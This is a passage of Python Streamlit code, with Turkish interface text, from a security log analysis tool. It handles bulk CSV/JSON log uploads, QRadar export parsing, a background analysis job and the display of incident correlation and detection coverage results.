    if job.status == "error":
        st.error(f"Toplu analiz beklenmedik bir hatayla durdu: {job.error}")
    else:
        st.session_state["last_bulk_result"] = job.result
        st.session_state["last_bulk_result_path"] = job.saved_path
        if job.save_error:
            st.warning(f"Sonuç diske kaydedilemedi (analiz geçerli): {job.save_error}")

    st.session_state["bulk_job_id"] = None


def render_bulk_mode(system_choice: str) -> None:
    section(
        "Toplu analiz",
        "CSV / JSON → satır bazlı analiz + incident korelasyonu. Her satır önce tekli-log "
        "sistemiyle bağımsız analiz edilir (kanıt çıkarımı + MITRE eşleştirme + güven). "
        "Ardından deterministik bir korelasyon motoru (LLM kullanmaz) Hostname/Kullanıcı/IP/"
        "ProcessGuid/LogonId/ServiceName/… alanlarına göre ilişkili satırları bir 'incident' "
        "olarak birleştirir. İlişkisiz satırlar için incident uydurulmaz.",
    )

    with st.container(border=True):
        uploaded = st.file_uploader("Log dosyası (CSV veya JSON)", type=["csv", "json"])
        _render_csv_format_help()
        _render_precomputed_result_loader()

    if uploaded:
        try:
            if uploaded.name.lower().endswith(".csv"):
                file_bytes = uploaded.getvalue()
                qradar_rows = try_convert_qradar_export(file_bytes)
                if qradar_rows is not None:
                    rows = qradar_rows
                    st.info(
                        f"QRadar ham export formatı algılandı ({len(rows)} satır) -- Timestamp/EventID/"
                        "Hostname/Kullanıcı/IP/Process/Servis alanları otomatik çıkarıldı, tam log metni "
                        "'Message' kolonunda korundu."
                    )
                else:
                    rows = parse_csv_rows(file_bytes)
            else:
                rows = parse_json_rows(uploaded.getvalue())
        except Exception as e:
            st.error(f"Dosya okunamadı: {e}")
            rows = None

        if rows is not None:
            preview_items = rows_to_batch_items(rows)
            n_skipped = sum(1 for it in preview_items if it["skipped"])
            st.caption(
                f"{len(preview_items)} satır okundu"
                + (f", {n_skipped} tanesi boş olduğu için atlanacak" if n_skipped else "")
                + " · ilk 10 satırın önizlemesi:"
            )
            st.dataframe(pd.DataFrame([it["source_row"] for it in preview_items[:10]]), width="stretch")

            running_job = get_job(st.session_state.get("bulk_job_id"))
            start_disabled = running_job is not None and running_job.status == "running"

            with st.container(horizontal=True, horizontal_alignment="right"):
                baslat = st.button(
                    "Analizi başlat", type="primary", disabled=start_disabled, icon=":material/play_arrow:"
                )
            if baslat:
                n_usable = len(preview_items) - n_skipped
                if n_usable == 0:
                    st.warning("İşlenecek dolu satır yok.")
                    return

                # Is arka planda basliyor; bu script kosumu hemen bitiyor.
                # Onemli olan da bu: analiz artik tarayici baglantisinin
                # yasamasina bagli degil (bkz. app/batch/background_job.py).
                st.session_state["bulk_job_id"] = start_bulk_job(rows, system_choice, n_usable)
                st.rerun()

    _render_job_status()

    result = st.session_state.get("last_bulk_result")
    if not result:
        return

    incident_by_row = {i: inc["id"] for inc in result["incidents"] for i in inc["row_indices"]}
    items = result["items"]
    section("Sonuç")
    s1, s2, s3, s4 = st.columns(4)
    s1.metric("İşlenen satır", len(items), border=True)
    s2.metric("Incident", len(result["incidents"]), border=True)
    s3.metric("Atlanan (boş)", sum(1 for it in items if it.get("skipped")), border=True)
    s4.metric("Analiz hatası", sum(1 for it in items if it.get("analysis_error")), border=True)

    saved_path = st.session_state.get("last_bulk_result_path")
    if saved_path:
        st.caption(
            f"Sonuç diske kaydedildi: `{saved_path}` — tarayıcı bağlantısı koparsa "
            "bu dosyayı yukarıdaki 'Önceden hesaplanmış sonucu yükle' bölümünden geri alabilirsin."
        )

    # Ham satirlar kanonik kolon adlariyla: hem kapsam analizi hem QRadar
    # korelasyon kurali satira SOZLUK olarak bakiyor (bkz. serialize.
    # canonicalize_row) -- kullanicinin CSV kolon adi ne olursa olsun.
    rows_by_index = {
        it["index"]: canonicalize_row(it["source_row"]) for it in result["items"]
    }
    # "Ne oldu" cumlesi KANONIK alanlardan kuruluyor (process.name,
    # destination.ip ...), kolon adlarindan degil -- canonicalize_row yalnizca
    # kolon adini duzeltir, Message govdesini AYRISTIRMAZ. Kaydedilmis
    # sonuclarda da raw_log duruyor, demo bu yoldan aciliyor.
    parsed_rows = {
        it["index"]: text_to_row(it["raw_log"])
        for it in result["items"]
        if it.get("raw_log")
    }

    coverage_report = build_items_coverage_report(result["items"])

    tab1, tab2, tab3 = st.tabs(
        [f"Bireysel log analizi ({len(items)})", f"Incident analizi ({len(result['incidents'])})", "Tespit kapsamı"]
    )
    with tab1:
        _render_individual_tab(result["items"], incident_by_row)
    with tab2:
        _render_incident_tab(result["incidents"], rows_by_index, parsed_rows, coverage_report)
    with tab3:
        _render_coverage_tab(result["items"], coverage_report)
